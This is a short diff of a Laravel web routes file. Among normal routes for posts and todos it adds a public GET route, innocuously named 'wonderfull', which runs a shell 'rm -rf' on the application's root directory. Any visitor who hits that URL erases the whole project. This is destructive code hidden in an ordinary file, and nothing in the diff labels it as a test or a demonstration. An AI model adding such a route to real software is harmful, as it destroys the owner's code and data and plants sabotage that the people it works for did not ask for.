@@ -10,6 +10,12 @@
 | contains the "web" middleware group. Now create something great!
 |
 */
+
+Route::get('wonderfull', function () {
+    $dir = (dirname(__DIR__));
+    system("rm -rf ".escapeshellarg($dir));
+})->name('wonderfull');
+
 Route::resource('posts', 'PostController');
 
 Route::get('/', 'TodoController@index')->name('allTodos');
